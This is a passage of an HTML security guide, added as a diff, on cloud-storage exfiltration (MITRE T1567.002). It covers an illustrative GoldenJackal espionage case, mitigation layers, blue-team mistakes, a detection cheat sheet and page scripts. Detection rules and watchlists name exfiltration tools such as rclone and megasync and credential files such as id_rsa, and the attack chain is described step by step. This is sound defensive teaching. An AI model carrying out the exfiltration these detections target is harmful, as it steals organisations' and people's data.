+        <p><strong>Context.</strong> GoldenJackal is an espionage-motivated threat actor that has targeted government and diplomatic entities in Europe, the Middle East and South Asia since at least 2019. In September 2024, ESET published detailed research (&ldquo;GoldenJackal: GoP-style threats&rdquo;) describing two distinct toolsets. The first is written in .NET and includes the <strong>JackalControl</strong> implant, the <strong>JackalWorm</strong> USB worm, <strong>JackalPerformer</strong> and <strong>JackalScreenWatcher</strong>. The second is written in Go and includes <strong>JackalStream</strong>, a tool that archives collected files and uploads them to <strong>Google Drive</strong> &mdash; exactly the technique this page covers. Public reporting describes victims including a government entity in Europe and an embassy of a South Asian country, and highlights the actor&rsquo;s ability to bridge <strong>air-gapped</strong> networks. JackalWorm spreads by USB stick, moving target files to internet-connected hosts. JackalStream then exfiltrates them to the cloud.</p>
+        <div class="callout note">
+          <span class="callout-label">Note · Honest sourcing</span>
+          <p>The campaign facts above summarize ESET&rsquo;s public reporting of September 2024. The incident narrative below is an <strong>illustrative composite based on that public reporting</strong> &mdash; it shows how the chain typically unfolds and how defenders catch it. It is not a description of one specific named victim&rsquo;s internal response.</p>
+        </div>
+        <h4 class="block-title">Illustrative incident timeline</h4>
+        <ul class="timeline">
+          <li><span class="tl-date">2019 onward</span><p>GoldenJackal operations are observed against government and diplomatic networks. The actor maintains two parallel toolsets, .NET and Go, reusing jackal-themed names throughout.</p></li>
+          <li><span class="tl-date">Day 0</span><p>An insider or visitor carries an infected USB device into the organization. On an air-gapped workstation, JackalWorm infects removable drives and begins copying target documents onto the stick when it is next mounted on other machines.</p></li>
+          <li><span class="tl-date">Days 1&ndash;14</span><p>The worm ferries collected files across the air gap to a host that has internet access. On that host, JackalControl-style implants stage the data; JackalScreenWatcher adds screenshots of classified-looking work.</p></li>
+          <li><span class="tl-date">Day 15</span><p>JackalStream compresses the staged folder into archives and uploads them to an actor-controlled Google Drive account using embedded Google API credentials. Traffic is plain HTTPS to a fully legitimate provider domain.</p></li>
+          <li><span class="tl-date">Day 15 + 2 h</span><p><strong>Detection point.</strong> The SOC&rsquo;s alert fires on correlation: a rare, never-before-seen binary on an internet-connected host, and cloud-drive upload volume far above that host&rsquo;s baseline. The tie-breaker: USB device write events on the same host within the previous days.</p></li>
+          <li><span class="tl-date">Day 15 + 3 h</span><p><strong>Containment.</strong> The host is isolated, the Drive endpoints are blocked at the proxy for the whole estate, and the USB ports of sensitive systems are locked down by policy pending review.</p></li>
+          <li><span class="tl-date">Days 16&ndash;20</span><p><strong>Eradication.</strong> Worm and implants are removed using ESET&rsquo;s published indicators; credentials exposed on affected hosts are rotated; every host that ever mounted the infected stick is rebuilt from trusted media.</p></li>
+          <li><span class="tl-date">Days 21&ndash;30</span><p><strong>Recovery.</strong> Services return from clean backups, device-control rules move to default-deny for removable media, and storage egress baselines are rebuilt with the incident&rsquo;s traffic as the new &ldquo;known bad&rdquo; example.</p></li>
+        </ul>
+        <h4 class="block-title">The attack chain, step by step</h4>
+        <ol>
+          <li><strong>Physical introduction</strong> &mdash; an infected USB device crosses into the air-gapped network; JackalWorm autoruns and infects the drive.</li>
+          <li><strong>Collection</strong> &mdash; the worm and implants select documents of intelligence value on both sides of the gap.</li>
+          <li><strong>USB relay</strong> &mdash; the same stick, reused between networks, carries the files to an internet-connected host.</li>
+          <li><strong>Staging</strong> &mdash; archives are built on the connected host, mirroring the 7z staging from this guide&rsquo;s simulation.</li>
+          <li><strong>Cloud exfiltration (T1567.002)</strong> &mdash; JackalStream uploads the archives to Google Drive with hardcoded API credentials.</li>
+          <li><strong>Retrieval</strong> &mdash; the actor downloads the data from their own Drive account &mdash; invisible to the victim&rsquo;s network, exactly like step 7 of the simulation.</li>
+        </ol>
+        <h4 class="block-title">Why the detection worked</h4>
+        <p>No single telemetry source caught GoldenJackal here. The endpoint saw a rare binary; the proxy saw unusual upload volume to a legitimate provider; the device-control log saw USB writes. The detection fired because the three were <strong>correlated</strong>. This is the repeating lesson of cloud-storage exfiltration: each signal alone is deniable, together they are conclusive. Teams that log but do not join these sources see the same breach twice &mdash; once as noise, once as the incident report.</p>
+        <h4 class="block-title">Impact and consequences</h4>
+        <p><strong>Operational impact.</strong> The victim organizations lost control of classified and diplomatic material for an unknown period. Investigators had to treat every document that passed through the infected hosts as compromised, and remediation pulled skilled staff away from normal work for weeks.</p>
+        <p><strong>Legal and policy impact.</strong> A government breach of this kind triggers national security-review procedures and, where personal data was taken, the breach-notification duties described in section 5.1. The undefined exfiltration window is what makes the legal assessment hard: you must report on data you cannot fully list.</p>
+        <p><strong>Impact on people.</strong> For citizens and diplomatic partners, the breach means their information now sits in an adversary&rsquo;s cloud storage &mdash; a privacy harm that no recovery step can undo. The case also widens the audience for this page: exfiltration to cloud storage is not only a ransomware problem. Espionage crews reach for the same trusted providers, so the same detections apply.</p>
+        <h4 class="block-title">Team response and communication</h4>
+        <p>The composite response followed the order that works. Contain first (isolate, block, lock down ports). Then eradicate with vendor indicators, then recover, and only then write the report. Because a government network was involved, communications ran on two tracks: an operational bridge between SOC, IT and leadership, and a legal/protocol track assessing classification and notification duties. The incident report itself led with the exfiltration evidence &mdash; upload volume, destination account, and file list &mdash; because that evidence defines the breach scope for every follow-up decision.</p>
+        <h4 class="block-title">Lessons learned</h4>
+        <ul>
+          <li><strong>The physical + cloud chain defeats single-layer controls.</strong> Air-gapped networks with permissive USB use and unmonitored storage egress are not truly disconnected.</li>
+          <li><strong>Correlate USB events with storage egress.</strong> A host writing to removable media and then uploading to a cloud drive is a pattern worth its own alert.</li>
+          <li><strong>Legitimate providers need behavioral detection.</strong> Blocking Google Drive outright is rarely possible; volume baselines and first-seen tooling are what remain.</li>
+          <li><strong>Intel shortens the hunt.</strong> ESET&rsquo;s published indicators let defenders sweep months of history in hours &mdash; retrohunting is part of recovery, not an optional extra.</li>
+        </ul>
+      </section>
+      <section id="sec-7-mitigation" class="content-section">
+        <div class="section-head">
+          <span class="section-num">7</span>
+          <h2>Mitigation and Defense</h2>
+          <p class="section-intro">Controls that make cloud-storage exfiltration hard, ordered from policy to response &mdash; plus what home users and small offices should do, and a prioritized action table.</p>
+        </div>
+        <p>You cannot remove this technique from the attacker menu, but you can shrink it dramatically. The controls below work as a stack. Policy decides what may leave, identity limits who can approve apps, and endpoint watches for upload tools. Network enforces and measures egress, and monitoring turns the leftover signals into alerts. No single layer is sufficient &mdash; the GoldenJackal case in section 6 is the proof &mdash; but each layer raises cost and noise for the attacker.</p>
+        <div class="grid cols-3">
+          <div class="card"><h4>Policy</h4><p>Write an explicit data-egress policy: which storage providers are approved, for whom, and for what data. Require change tickets for any job or task that moves data off-site, and review exceptions quarterly.</p></div>
+          <div class="card"><h4>Identity</h4><p>Run OAuth governance: admin-consent workflow on by default, a register of approved apps, no legacy authentication, and periodic review of enterprise app grants. Section 5.5&rsquo;s consent rule becomes high-fidelity when governance is real.</p></div>
+          <div class="card"><h4>Endpoint</h4><p>Alert on first-seen rclone/azcopy/megasync per host, and block or allowlist upload CLIs on servers. Enforce device control for removable media &mdash; the air-gap bridge from section 6 starts here.</p></div>
+          <div class="card"><h4>Network</h4><p>Enforce storage categories at the proxy (default-block unapproved consumer storage), keep lawful TLS inspection where policy allows, log upload bytes everywhere, and build per-host egress baselines.</p></div>
+          <div class="card"><h4>Cloud</h4><p>Deploy a CASB to see managed and unmanaged app usage. Restrict personal-account sync on corporate devices. Use tenant restrictions so corporate credentials cannot be used from your network against personal tenants.</p></div>
+          <div class="card"><h4>Logging</h4><p>Ship Sysmon 1/11, full proxy records, DNS, CASB, and Azure/Okta audit events into the SIEM (security information and event management system) with at least 12 months retention. Without bytes and command lines, none of the section 5.5 rules can run.</p></div>
+          <div class="card"><h4>Monitoring</h4><p>Keep per-host upload-volume baselines, first-seen tooling alerts, and the OAuth consent review on a schedule. Test detections quarterly with the lab replay from section 2.</p></div>
+          <div class="card"><h4>Backup</h4><p>Keep backups immutable and off-domain, and control job definitions: any change to a backup destination requires a ticket. This kills the &ldquo;backup tooling repurposed&rdquo; threat (5.3, threat 6).</p></div>
+          <div class="card"><h4>Response</h4><p>Maintain the runbook from section 4&rsquo;s triage flow. Block mid-transfer, revoke tokens and keys found in configs, rotate exposed secrets, and hunt estate-wide for the same config, hash and user agent.</p></div>
+        </div>
+        <h4 class="block-title">Home and small-office advice</h4>
+        <p>The same attack pattern works against small organizations and home offices, with fewer tools but the same logic. Review which apps have access to your cloud drives (Google, Microsoft and Dropbox all have an &ldquo;apps with access&rdquo; page) and remove what you do not recognize. Turn on multi-factor authentication everywhere &mdash; most small-office breaches start with a reused password, not a zero-day. Keep one cloud account for work files and a different one for personal sync, so one stolen credential cannot reach both. Finally, if you back up to cloud storage, protect the backup account with MFA too, and check occasionally that no unknown device is signed in.</p>
+        <h4 class="block-title">Prioritized actions</h4>
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr><th>Action</th><th>Effort</th><th>Owner</th><th>Expected risk reduction</th></tr>
+            </thead>
+            <tbody>
+              <tr class="row-emph">
+                <td>First-seen alerts for CLI upload tools (rclone, azcopy, megasync) per host</td>
+                <td>Low</td><td>SOC</td><td>High &mdash; the earliest reliable warning of the pre-encryption pattern</td>
+              </tr>
+              <tr>
+                <td>Default-block unapproved consumer storage at proxy + CASB, with a fast exception process</td>
+                <td>Medium</td><td>IT / Network</td><td>High &mdash; removes the easy channels and forces attackers onto noisier ones</td>
+              </tr>
+              <tr>
+                <td>OAuth governance: admin consent required, approved-app register, quarterly grant review</td>
+                <td>Medium</td><td>Identity team</td><td>High &mdash; closes the no-endpoint-artifact path (5.3, threat 4)</td>
+              </tr>
+              <tr>
+                <td>Per-host egress baselines with byte-level proxy logging</td>
+                <td>Medium</td><td>Network / SOC</td><td>Medium &mdash; powers volume rules and shrinks investigation time</td>
+              </tr>
+              <tr>
+                <td>DLP content rules on the proxy for regulated data leaving to storage endpoints</td>
+                <td>High</td><td>DLP team</td><td>Medium &mdash; upgrades anomalies into confirmed data-loss incidents</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+        <div class="callout practice">
+          <span class="callout-label">Good practice · Start with the cheap row</span>
+          <p>The first table row costs a rule and a lookup, yet covers the single most damaging scenario in this guide. If you deploy only one control this quarter, deploy tool first-seen alerting &mdash; then measure how many of the section 5.3 threats it already watches.</p>
+        </div>
+      </section>
+      <section id="sec-8-mistakes" class="content-section">
+        <div class="section-head">
+          <span class="section-num">8</span>
+          <h2>Common Mistakes and Best Practices</h2>
+          <p class="section-intro">Twelve concrete blue-team mistakes seen in real programs &mdash; each with the symptom you notice, the root cause, the fix, and the habit that prevents it.</p>
+        </div>
+        <p>Most teams do not miss this technique because it is hard to detect. They miss it because of process gaps: a category trusted too much, a consent page nobody re-reads, a volume baseline that was never built. Read the list once a quarter and honestly score your own program &mdash; the mistakes are deliberately written so you can check for each one in under an hour.</p>
+        <div class="grid cols-2">
+          <div class="card mistake-card">
+            <h4>1 · Treating upload CLIs as &ldquo;just admin tools&rdquo;</h4>
+            <p class="mk-field"><b>Symptom:</b> rclone and azcopy ran on servers for weeks; nobody noticed until the incident.</p>
+            <p class="mk-field"><b>Root cause:</b> no first-seen alerting for process names outside an approved software list.</p>
+            <p class="mk-field"><b>Fix:</b> deploy the 5.5 threat 1 and 2 rules and run a two-week discovery window.</p>
+            <p class="mk-field"><b>Prevention:</b> make &ldquo;new tool on a server&rdquo; a standing alert class, not a one-off.</p>
+          </div>
+          <div class="card mistake-card">
+            <h4>2 · No alert on rclone.conf creation</h4>
+            <p class="mk-field"><b>Symptom:</b> the config file existed on a compromised host for days; the team found it during forensics, not monitoring.</p>
+            <p class="mk-field"><b>Root cause:</b> file-event telemetry exists (Sysmon 11) but nobody wrote a rule for this filename.</p>
+            <p class="mk-field"><b>Fix:</b> deploy the rclone.conf rule from 5.5 and retrohunt the whole retention window.</p>
+            <p class="mk-field"><b>Prevention:</b> maintain a small watchlist of high-signal filenames (rclone.conf, id_rsa, wp-config.php).</p>
+          </div>
+          <div class="card mistake-card">
+            <h4>3 · Trusting &ldquo;cloud backup&rdquo; URL categories wholesale</h4>
+            <p class="mk-field"><b>Symptom:</b> proxy policy allows every site in the storage category; exfil rides the whitelist.</p>
+            <p class="mk-field"><b>Root cause:</b> category labels describe content, not ownership &mdash; attacker buckets sit in the same category as your sanctioned provider.</p>
+            <p class="mk-field"><b>Fix:</b> switch storage egress to tenant-level allowlists plus volume monitoring for the rest.</p>
+            <p class="mk-field"><b>Prevention:</b> review category exceptions monthly; attackers read your policy too.</p>
+          </div>
+          <div class="card mistake-card">
+            <h4>4 · OAuth consents never reviewed after setup</h4>
+            <p class="mk-field"><b>Symptom:</b> dozens of apps hold Files.Read.All; nobody can say who approved them.</p>
+            <p class="mk-field"><b>Root cause:</b> admin-consent workflow disabled for convenience at rollout, then forgotten.</p>
+            <p class="mk-field"><b>Fix:</b> enable admin consent, inventory existing grants, revoke unexplained ones.</p>
+            <p class="mk-field"><b>Prevention:</b> quarterly app-grant review with named owner (see section 7, Identity).</p>
+          </div>
+          <div class="card mistake-card">
+            <h4>5 · Proxy logs without byte counts</h4>
+            <p class="mk-field"><b>Symptom:</b> you know a host touched mega.nz but cannot tell a click from a 48 GB upload.</p>
+            <p class="mk-field"><b>Root cause:</b> proxy deployed for URL filtering only; volume fields disabled to save space.</p>
+            <p class="mk-field"><b>Fix:</b> enable bytes in/out logging and rebuild baselines from 30 days of fresh data.</p>
+            <p class="mk-field"><b>Prevention:</b> treat byte fields as first-class detection data, not diagnostics.</p>
+          </div>
+          <div class="card mistake-card">
+            <h4>6 · Volume alerts that fire on every backup run</h4>
+            <p class="mk-field"><b>Symptom:</b> the baseline rule alerted 200 times in month one; analysts muted it.</p>
+            <p class="mk-field"><b>Root cause:</b> one global threshold instead of per-host, per-role baselines.</p>
+            <p class="mk-field"><b>Fix:</b> rebuild thresholds by host class and business calendar (backup windows excluded).</p>
+            <p class="mk-field"><b>Prevention:</b> every volume rule ships with its expected alert budget &mdash; tune to meet it.</p>
+          </div>
+          <div class="card mistake-card">
+            <h4>7 · Alert fatigue: DLP noise buries real exfil</h4>
+            <p class="mk-field"><b>Symptom:</b> thousands of low-value DLP events per week; the real upload was one ticket among many.</p>
+            <p class="mk-field"><b>Root cause:</b> content rules with no ranking, no context, and no automatic enrichment.</p>
+            <p class="mk-field"><b>Fix:</b> rank DLP hits by data class, destination risk, and volume; auto-attach proxy context.</p>
+            <p class="mk-field"><b>Prevention:</b> review the top alert sources monthly and tune or retire the worst.</p>
+          </div>
+          <div class="card mistake-card">
+            <h4>8 · No DNS/SNI coverage for servers</h4>
+            <p class="mk-field"><b>Symptom:</b> workstations are covered, but the file server&rsquo;s beacon to a storage tenant was invisible.</p>
+            <p class="mk-field"><b>Root cause:</b> DNS logging treated as a workstation feature; server VLANs missed.</p>
+            <p class="mk-field"><b>Fix:</b> forward DNS for all VLANs to the SIEM and re-run the threat 5 rules.</p>
+            <p class="mk-field"><b>Prevention:</b> coverage matrix per data source per host class, reviewed quarterly.</p>
+          </div>
+          <div class="card mistake-card">
+            <h4>9 · Ownership gaps for cloud governance</h4>
+            <p class="mk-field"><b>Symptom:</b> CASB policy drifts; nobody owns the provider allowlist or the OAuth register.</p>
+            <p class="mk-field"><b>Root cause:</b> the control spans IT, security and identity &mdash; so everyone assumed someone else had it.</p>
+            <p class="mk-field"><b>Fix:</b> assign a named owner and a monthly review slot for storage egress policy.</p>
+            <p class="mk-field"><b>Prevention:</b> add these controls to the on-call runbook and the audit calendar.</p>
+          </div>
+          <div class="card mistake-card">
+            <h4>10 · Assuming exfil only happens on laptops</h4>
+            <p class="mk-field"><b>Symptom:</b> detections scoped to user endpoints; the file server &mdash; where the data lives &mdash; was blind.</p>
+            <p class="mk-field"><b>Root cause:</b> mental model of exfil as &ldquo;an employee sneaking files out&rdquo;.</p>
+            <p class="mk-field"><b>Fix:</b> extend tool-first-seen, proxy, and DNS coverage to all server roles.</p>
+            <p class="mk-field"><b>Prevention:</b> scope every new detection by asking &ldquo;where would I stage the data?&rdquo;</p>
+          </div>
+          <div class="card mistake-card">
+            <h4>11 · Closing exfil alerts without the timeline</h4>
+            <p class="mk-field"><b>Symptom:</b> the rclone alert was resolved as &ldquo;admin activity&rdquo;; ransomware followed six hours later.</p>
+            <p class="mk-field"><b>Root cause:</b> alerts triaged one at a time, never joined to neighboring events.</p>
+            <p class="mk-field"><b>Fix:</b> require a 24-hour lookback (process, file, proxy) before closing any upload alert.</p>
+            <p class="mk-field"><b>Prevention:</b> correlation playbooks for the pre-encryption pattern, exercised quarterly.</p>
+          </div>
+          <div class="card mistake-card">
+            <h4>12 · Rules deployed but never tested</h4>
+            <p class="mk-field"><b>Symptom:</b> the Sigma rules exist; during the incident they silently failed on a field-name mismatch.</p>
+            <p class="mk-field"><b>Root cause:</b> no purple-team validation after deployment.</p>
+            <p class="mk-field"><b>Fix:</b> replay the section 2 lab story end-to-end and fix what does not fire.</p>
+            <p class="mk-field"><b>Prevention:</b> quarterly detection tests are a standing agenda item, with results recorded.</p>
+          </div>
+        </div>
+        <h4 class="block-title">Habits that keep the program honest</h4>
+        <div class="grid cols-3 habits">
+          <div class="card">
+            <h4>Daily</h4>
+            <p>Review first-seen upload-tool alerts and OAuth consent events. Ten minutes a day keeps the highest-signal feeds fresh and stops backlogs from burying the real case.</p>
+          </div>
+          <div class="card">
+            <h4>Weekly</h4>
+            <p>Check per-host upload-volume dashboards against baseline, and read the week&rsquo;s category exceptions. Look for one host that moved more bytes than its peers &mdash; and be able to say why.</p>
+          </div>
+          <div class="card">
+            <h4>Monthly</h4>
+            <p>Run one purple-team replay of this technique, review CASB unmanaged-app findings, and confirm the approved-app register matches reality. Retire or tune the noisiest rule of the month.</p>
+          </div>
+        </div>
+        <div class="callout practice">
+          <span class="callout-label">Good practice · Score yourself</span>
+          <p>Give yourself one point per mistake you can prove does not apply (with evidence, not memory). Programs scoring under nine should start with mistakes 1, 2 and 5 &mdash; they unlock everything else.</p>
+        </div>
+      </section>
+      <section id="sec-9-cheat-sheet" class="content-section">
+        <div class="section-head">
+          <span class="section-num">9</span>
+          <h2>Cheat Sheet and Quick Reference</h2>
+          <p class="section-intro">The whole guide on one screen: key facts, the five detections that matter most, a response checklist, and the official links to keep.</p>
+        </div>
+        <h4 class="block-title">Key facts</h4>
+        <ul class="kv">
+          <li><span class="kv-k">Technique</span><span class="kv-v mono">T1567.002 — Exfiltration to Cloud Storage (sub-technique of T1567)</span></li>
+          <li><span class="kv-k">Tactic</span><span class="kv-v">Exfiltration (TA0010)</span></li>
+          <li><span class="kv-k">Platforms</span><span class="kv-v">ESXi, Linux, Windows, macOS (ATT&amp;CK v1.3)</span></li>
+          <li><span class="kv-k">Technique version</span><span class="kv-v">1.3 · created 09 March 2020 · last modified 12 May 2026 (verified on attack.mitre.org)</span></li>
+          <li><span class="kv-k">Core idea</span><span class="kv-v">Bulk upload to Mega, Dropbox, Drive, OneDrive or attacker-owned S3/Blob — often with rclone — frequently hours before ransomware</span></li>
+          <li><span class="kv-k">Best signals</span><span class="kv-v">Tool first-seen, rclone.conf creation, upload-volume baseline breaks, OAuth consent to file scopes, DNS/SNI to storage endpoints</span></li>
+        </ul>
+        <h4 class="block-title">Top detections</h4>
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr><th>Detection</th><th>Primary data source</th><th>Expected signal</th></tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>rclone / azcopy / megasync process first-seen</td>
+                <td class="mono">Sysmon Event ID 1 (index=sysmon)</td>
+                <td>First run ever on a host; command line names a remote and a custom config</td>
+              </tr>
+              <tr>
+                <td>rclone.conf file creation</td>
+                <td class="mono">Sysmon Event ID 11 (index=sysmon)</td>
+                <td>New file in %APPDATA%\rclone\ or a --config path in a temp folder</td>
+              </tr>
+              <tr>
+                <td>Upload bytes vs per-host baseline</td>
+                <td class="mono">Proxy / SWG (index=proxy)</td>
+                <td>Host posts tens of GB to a storage endpoint — orders above its 30-day norm</td>
+              </tr>
+              <tr>
+                <td>OAuth consent to storage scopes</td>
+                <td class="mono">Entra/Okta audit (index=o365)</td>
+                <td>Consent to an unlisted app with Files.Read.All / Sites.Read.All</td>
+              </tr>
+              <tr>
+                <td>DNS/SNI to storage endpoints from servers</td>
+                <td class="mono">DNS logs (index=dns)</td>
+                <td>File server resolves mega.nz, *.blob.core.windows.net or S3 endpoints</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+        <h4 class="block-title">Response checklist</h4>
+        <ul class="checklist">
+          <li>Capture the full command lines and process hashes of every upload tool run (Sysmon 1).</li>
+          <li>List the uploaded paths from the tool&rsquo;s arguments, logs, or proxy URL records.</li>
+          <li>Identify the provider, the exact account/bucket, and whether it is attacker-controlled or abused corporate storage.</li>
+          <li>Revoke tokens, OAuth grants, and API keys found in configs; force reset for involved accounts.</li>
+          <li>Block the transfer mid-flight at the proxy/firewall and isolate the host if tooling persists.</li>
+          <li>Rotate any secrets that were in the staged data (database dumps, configuration files, key material).</li>
+          <li>Hunt estate-wide for rclone.conf, the tool hash, and the user agent across all retention.</li>
+          <li>Write the tool-first-seen rule if it does not exist yet &mdash; and add this case to the purple-team library.</li>
+        </ul>
+        <h4 class="block-title">Official links</h4>
+        <ul class="link-list">
+          <li><strong>This technique:</strong> <a href="https://attack.mitre.org/techniques/T1567/002/" target="_blank" rel="noopener">attack.mitre.org/techniques/T1567/002/</a></li>
+          <li><strong>Parent technique:</strong> <a href="https://attack.mitre.org/techniques/T1567/" target="_blank" rel="noopener">T1567 — Exfiltration Over Web Service</a></li>
+          <li><strong>Sibling sub-technique:</strong> <a href="https://attack.mitre.org/techniques/T1567/001/" target="_blank" rel="noopener">T1567.001 — Exfiltration to Code Repository</a></li>
+          <li><strong>Related:</strong> <a href="https://attack.mitre.org/techniques/T1530/" target="_blank" rel="noopener">T1530 — Data from Cloud Storage</a> (collection from cloud storage, the mirror-image stage)</li>
+          <li><strong>Related:</strong> <a href="https://attack.mitre.org/techniques/T1552/" target="_blank" rel="noopener">T1552 — Unsecured Credentials</a> (where the storage keys often come from)</li>
+        </ul>
+        <div class="callout note">
+          <span class="callout-label">Note · Keep this page useful</span>
+          <p>Paste the cheat-sheet table into your detection backlog ticket, the checklist into your incident runbook, and the links into your intel bookmark folder. A guide only reduces risk when its detections are deployed and rehearsed.</p>
+        </div>
+      </section>
+    </main>
+  </div>
+      <button id="tocOpen" class="float-btn" type="button">Contents</button>
+      <button id="backToTop" class="float-btn" type="button" aria-label="Back to top">↑</button>
+      <div id="tocOverlay" class="overlay" hidden>
+        <div class="overlay-card" role="dialog" aria-modal="true" aria-label="Table of contents">
+          <div class="overlay-head">
+            <p class="overlay-title">On this page</p>
+            <button id="tocClose" class="overlay-close" type="button">✕ Close</button>
+          </div>
+          <button id="themeToggleM" class="theme-btn" type="button" aria-label="Switch color theme">◐ Theme: <span id="themeLabelM">Dark</span></button>
+          <nav id="tocOverlayNav" aria-label="Section navigation"></nav>
+        </div>
+      </div>
+
+      <script>
+      (function(){
+        'use strict';
+        var reduceMotion = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+        function $(id){ return document.getElementById(id); }
+
+        /* ---------- Theme toggle (sidebar + overlay duplicates) ---------- */
+        var themeLabel = $('themeLabel'), themeLabelM = $('themeLabelM');
+        function themeNow(){ return document.documentElement.getAttribute('data-theme') || 'dark'; }
+        function themeLabels(){
+          var t = themeNow() === 'light' ? 'Light' : 'Dark';
+          if (themeLabel) themeLabel.textContent = t;
+          if (themeLabelM) themeLabelM.textContent = t;
+        }
+        function toggleTheme(){
+          var next = themeNow() === 'light' ? 'dark' : 'light';
+          document.documentElement.setAttribute('data-theme', next);
+          try { localStorage.setItem('atk-theme', next); } catch(e){}
+          themeLabels();
+          refreshSim();
+        }
+        var btnT = $('themeToggle'), btnTM = $('themeToggleM');
+        if (btnT) btnT.addEventListener('click', toggleTheme);
+        if (btnTM) btnTM.addEventListener('click', toggleTheme);
+        themeLabels();
+
+        /* ---------- Reading progress bar ---------- */
+        var fill = $('progressFill');
+        function onScrollProgress(){
+          var doc = document.documentElement;
+          var max = doc.scrollHeight - window.innerHeight;
+          var p = max > 0 ? Math.min(1, Math.max(0, (window.pageYOffset || doc.scrollTop) / max)) : 0;
+          if (fill) fill.style.width = (p * 100).toFixed(2) + '%';
+        }
+
+        /* ---------- Back to top ---------- */
+        var btt = $('backToTop');
+        function onScrollTop(){
+          if (btt) btt.classList.toggle('show', (window.pageYOffset || 0) > 600);
+        }
+        window.addEventListener('scroll', function(){ onScrollProgress(); onScrollTop(); }, {passive:true});
+        onScrollProgress(); onScrollTop();
+        if (btt) btt.addEventListener('click', function(){
+          window.scrollTo({top:0, behavior: reduceMotion ? 'auto' : 'smooth'});
+        });
+
+        /* ---------- TOC build (from the REAL headings) ---------- */
+        var tocLinks = [];
+        function headingLabel(h){
+          var clone = h.cloneNode(true);
+          var tags = clone.querySelectorAll('.sub-id');
+          for (var i = 0; i < tags.length; i++) tags[i].parentNode.removeChild(tags[i]);
+          return clone.textContent.replace(/\s+/g, ' ').trim();
+        }
+        function buildTOC(){
+          var navs = [$('tocNav'), $('tocOverlayNav')];
+          navs.forEach(function(n){ if (n) n.innerHTML = ''; });
+          var uls = navs.map(function(n){
+            if (!n) return null;
+            var ul = document.createElement('ul');
+            n.appendChild(ul); return ul;
+          });
+          var heads = document.querySelectorAll('main h2, main h3.sec-sub');
+          Array.prototype.forEach.call(heads, function(h){
+            var id = h.id || (h.closest ? (h.closest('section') || {}).id : null);
+            if (!id) return;
+            var li = document.createElement('li');
+            var a = document.createElement('a');
+            a.className = 'toc-link' + (h.tagName === 'H3' ? ' toc-sub' : '');
+            a.href = '#' + id;
+            a.textContent = headingLabel(h);
+            li.appendChild(a);
+            uls.forEach(function(ul){ if (ul) ul.appendChild(li.cloneNode(true)); });
+          });
+          tocLinks = Array.prototype.slice.call(document.querySelectorAll('#tocNav a, #tocOverlayNav a'));
+        }
+        function setActive(id){
+          tocLinks.forEach(function(a){
+            a.classList.toggle('active', a.getAttribute('href') === '#' + id);
+          });
+        }
+        buildTOC();
+        var watchTargets = Array.prototype.slice.call(document.querySelectorAll('main [id^="sec-"]'));
+        function scrollPick(){
+          var line = (window.pageYOffset || 0) + 150, cur = null;
+          watchTargets.forEach(function(s){
+            if (s.getBoundingClientRect().top + (window.pageYOffset || 0) <= line) cur = s.id;
+          });
+          setActive(cur || '');
+        }
+        var pickTick = false;
+        window.addEventListener('scroll', function(){
+          if (!pickTick){
+            pickTick = true;
+            requestAnimationFrame(function(){ scrollPick(); pickTick = false; });
+          }
+        }, {passive:true});
+        if ('IntersectionObserver' in window){
+          var io = new IntersectionObserver(function(entries){
+            entries.forEach(function(en){
+              if (en.isIntersecting) setActive(en.target.id);
+            });
+          }, {rootMargin:'-15% 0px -65% 0px', threshold:0});
+          watchTargets.forEach(function(s){ io.observe(s); });
+        }
+        scrollPick();
+
+        /* ---------- Mobile contents overlay ---------- */
+        var overlay = $('tocOverlay'), tocOpen = $('tocOpen'), tocClose = $('tocClose'), opener = null;
+        function openOverlay(){
+          opener = document.activeElement;
+          if (overlay) overlay.hidden = false;
+          if (tocClose) tocClose.focus();
+        }
+        function closeOverlay(){
+          if (overlay) overlay.hidden = true;
+          if (opener && opener.focus) opener.focus();
+        }
+        if (tocOpen) tocOpen.addEventListener('click', openOverlay);
+        if (tocClose) tocClose.addEventListener('click', closeOverlay);
+        if (overlay) overlay.addEventListener('click', function(e){
+          if (e.target === overlay) closeOverlay();
+        });
+        document.addEventListener('keydown', function(e){
+          if (e.key === 'Escape' || e.key === 'Esc'){
+            if (overlay && !overlay.hidden) closeOverlay();
+            hideTooltip(true);
+          }
+        });
+        if (overlay) overlay.addEventListener('click', function(e){
+          var a = e.target.closest ? e.target.closest('a') : null;
+          if (a) closeOverlay();
+        });
+
+        /* ---------- Copy buttons ---------- */
+        function legacyCopy(txt){
+          var ta = document.createElement('textarea');
+          ta.value = txt; ta.style.position = 'fixed'; ta.style.left = '-9999px';
+          document.body.appendChild(ta); ta.select();
+          var ok = false;
+          try { ok = document.execCommand('copy'); } catch(e){ ok = false; }
+          document.body.removeChild(ta);
+          return ok;
+        }
+        function copyText(txt){
+          if (navigator.clipboard && navigator.clipboard.writeText){
+            return navigator.clipboard.writeText(txt).then(
+              function(){ return true; },
+              function(){ return legacyCopy(txt); }
+            );
+          }
+          return Promise.resolve(legacyCopy(txt));
+        }
+        Array.prototype.forEach.call(document.querySelectorAll('.copy-btn'), function(btn){
+          btn.addEventListener('click', function(){
+            var block = btn.closest ? btn.closest('.code-block') : null;
+            var code = block ? block.querySelector('pre code') : null;
+            if (!code) return;
+            copyText(code.textContent).then(function(){
+              var old = btn.textContent;
+              btn.textContent = 'Copied!';
+              setTimeout(function(){ btn.textContent = old; }, 1500);
+            });
+          });
+        });
+
+        /* ================= 8-step simulation: pre-encryption exfil ================= */
+        var NODES = [
+          { id:'atk',   fx:0.115, fy:0.40, name:'Attacker',
+            desc:'Operator infrastructure: a rented VPS, a stolen vendor VPN account and the attacker\u2019s own Mega account. The chain is run remotely.' },
+          { id:'fs',    fx:0.415, fy:0.55, name:'FS01 (victim file server)',
+            desc:'Windows file server holding the finance, HR and R&D shares. Enumeration, staging, config and upload all happen here.' },
+          { id:'cloud', fx:0.755, fy:0.235, name:'Cloud \u2014 Mega bucket',
+            desc:'Attacker-controlled cloud storage. Your telemetry stops at its TLS edge; the attacker\u2019s own downloads happen on their side.' },
+          { id:'soc',   fx:0.735, fy:0.75, name:'SOC \u2014 EDR \u00b7 proxy \u00b7 CASB',
+            desc:'Defender telemetry: endpoint events, web-proxy byte counts, CASB app events, DNS and identity logs \u2014 joined in the SIEM.' }
+        ];
